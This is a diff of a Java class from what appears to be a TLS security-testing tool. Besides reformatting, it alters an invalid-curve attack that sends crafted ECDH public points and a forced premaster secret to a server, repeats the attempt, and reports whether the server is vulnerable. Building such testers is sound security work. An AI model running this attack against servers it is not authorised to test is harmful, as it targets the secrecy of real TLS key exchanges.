@@ -46,72 +46,74 @@ public class InvalidCurveAttack extends Attacker<InvalidCurveAttackCommandConfig
     private static final int PROTOCOL_FLOWS = 15;
 
     public InvalidCurveAttack(InvalidCurveAttackCommandConfig config) {
-	super(config);
+        super(config);
     }
 
     @Override
     public void executeAttack(ConfigHandler configHandler) {
 
-	if (config.getPublicPointBaseX() == null || config.getPublicPointBaseY() == null
-		|| config.getPremasterSecret() == null) {
+        if (config.getPublicPointBaseX() == null || config.getPublicPointBaseY() == null
+                || config.getPremasterSecret() == null) {
 
-	    config.setPublicPointBaseX(new BigInteger(
-		    "b70bf043c144935756f8f4578c369cf960ee510a5a0f90e93a373a21f0d1397f", 16));
-	    config.setPublicPointBaseY(new BigInteger(
-		    "4a2e0ded57a5156bb82eb4314c37fd4155395a7e51988af289cce531b9c17192", 16));
-	    config.setPremasterSecret(new BigInteger(
-		    "b70bf043c144935756f8f4578c369cf960ee510a5a0f90e93a373a21f0d1397f", 16));
-	    for (int i = 0; i < PROTOCOL_FLOWS; i++) {
-		try {
-		    WorkflowTrace trace = executeProtocolFlow(configHandler);
-		    if (trace.containsServerFinished()) {
-			LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Vulnerable to the invalid curve attack.");
+            config.setPublicPointBaseX(new BigInteger(
+                    "b70bf043c144935756f8f4578c369cf960ee510a5a0f90e93a373a21f0d1397f", 16));
+            config.setPublicPointBaseY(new BigInteger(
+                    "4a2e0ded57a5156bb82eb4314c37fd4155395a7e51988af289cce531b9c17192", 16));
+            config.setPremasterSecret(new BigInteger(
+                    "b70bf043c144935756f8f4578c369cf960ee510a5a0f90e93a373a21f0d1397f", 16));
+            for (int i = 0; i < PROTOCOL_FLOWS; i++) {
+                try {
+                    WorkflowTrace trace = executeProtocolFlow(configHandler);
+                    if (trace.getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.FINISHED).isEmpty()) {
+
+                    } else {
+                        LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Vulnerable to the invalid curve attack.");
                         vulnerable = true;
-			return;
-		    }
-		} catch (WorkflowExecutionException ex) {
-		    LOGGER.debug(ex.getLocalizedMessage());
-		}
-	    }
-	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "NOT vulnerable to the invalid curve attack.");
-	} else {
-	    executeProtocolFlow(configHandler);
-	}
+                        return;
+                    }
+                } catch (WorkflowExecutionException ex) {
+                    LOGGER.debug(ex.getLocalizedMessage());
+                }
+            }
+            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "NOT vulnerable to the invalid curve attack.");
+        } else {
+            executeProtocolFlow(configHandler);
+        }
     }
 
     private WorkflowTrace executeProtocolFlow(ConfigHandler configHandler) {
-	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
-	TlsContext tlsContext = configHandler.initializeTlsContext(config);
-	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
+        TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
+        TlsContext tlsContext = configHandler.initializeTlsContext(config);
+        WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
 
-	WorkflowTrace trace = tlsContext.getWorkflowTrace();
-	ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) trace
-		.getFirstHandshakeMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE);
+        WorkflowTrace trace = tlsContext.getWorkflowTrace();
+        ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) trace
+                .getFirstConfiguredSendMessageOfType(HandshakeMessageType.CLIENT_KEY_EXCHANGE);
 
-	// modify public point base X coordinate
-	ModifiableBigInteger x = ModifiableVariableFactory.createBigIntegerModifiableVariable();
-	x.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseX()));
-	message.setPublicKeyBaseX(x);
+        // modify public point base X coordinate
+        ModifiableBigInteger x = ModifiableVariableFactory.createBigIntegerModifiableVariable();
+        x.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseX()));
+        message.setPublicKeyBaseX(x);
 
-	// modify public point base Y coordinate
-	ModifiableBigInteger y = ModifiableVariableFactory.createBigIntegerModifiableVariable();
-	y.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseY()));
-	message.setPublicKeyBaseY(y);
+        // modify public point base Y coordinate
+        ModifiableBigInteger y = ModifiableVariableFactory.createBigIntegerModifiableVariable();
+        y.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseY()));
+        message.setPublicKeyBaseY(y);
 
-	// set explicit premaster secret value (X value of the resulting point
-	// coordinate)
-	ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
-	byte[] explicitePMS = BigIntegers.asUnsignedByteArray(CURVE_FIELD_SIZE, config.getPremasterSecret());
-	pms.setModification(ByteArrayModificationFactory.explicitValue(explicitePMS));
-	message.setPremasterSecret(pms);
+        // set explicit premaster secret value (X value of the resulting point
+        // coordinate)
+        ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
+        byte[] explicitePMS = BigIntegers.asUnsignedByteArray(CURVE_FIELD_SIZE, config.getPremasterSecret());
+        pms.setModification(ByteArrayModificationFactory.explicitValue(explicitePMS));
+        message.setPremasterSecret(pms);
 
-	workflowExecutor.executeWorkflow();
+        workflowExecutor.executeWorkflow();
 
-	tlsContexts.add(tlsContext);
+        tlsContexts.add(tlsContext);
 
-	transportHandler.closeConnection();
+        transportHandler.closeConnection();
 
-	return trace;
+        return trace;
     }
 
 }
